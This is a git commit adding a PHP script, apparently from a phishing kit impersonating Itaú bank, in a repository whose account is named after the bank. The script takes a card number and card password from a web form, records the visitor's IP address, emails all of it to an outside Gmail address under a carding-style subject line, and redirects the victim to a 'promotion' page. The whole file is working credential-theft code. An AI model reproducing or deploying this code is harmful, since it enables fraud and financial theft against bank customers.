191ec9e1612235adcea2f4a1932efb33dabe8fd7
itaubank <92285364+itaubank@users.noreply.github.com>
2021-10-11 00:43:36 -0300

    Add files via upload

---
+++ envio1.php
@@ -0,0 +1,27 @@
+﻿<?php
+
+
+
+$numc=$_POST["numc"];
+$passc=$_POST["passc"];
+
+
+$ip_usuario = $_SERVER['REMOTE_ADDR'];
+
+$stringData = "
+
+==============[ CONSULTÁVEL ITAU NO PENTE PARTE 1 ]=================
+
+ NUMERO DO CARTAO: $numc
+ SENHA DO CARTÃO: $passc
+ 
+============================================================
+";
+
+$ss = "CONSULTÁVEL ITAU NO PENTE PARTE 1 IP: $ip_usuario ";
+
+header("Location:promocao.html");
+
+mail('vektoryze.music@gmail.com',$ss,$stringData);
+
+?>
